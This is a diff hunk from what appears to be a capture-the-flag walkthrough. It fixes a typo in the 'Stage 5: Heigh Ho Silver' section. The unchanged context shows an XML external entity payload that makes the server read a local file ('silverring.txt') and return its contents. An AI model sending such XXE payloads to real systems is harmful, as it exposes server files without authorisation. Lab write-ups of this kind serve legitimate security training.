@@ -208,7 +208,7 @@ bluering.txt
 ```
 ### Stage 5: Heigh Ho Silver
 
-So red, blue struck out.. How about trying silver?  
+So red and blue struck out.. How about trying silver?  
 ```javascript
 "body": "<?xml version='1.0' ?><!DOCTYPE root   [ <!ENTITY xxe SYSTEM 'file:///app/static/images/x_phial_pholder_2022/silverring.txt' >]> <root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>",
 ```
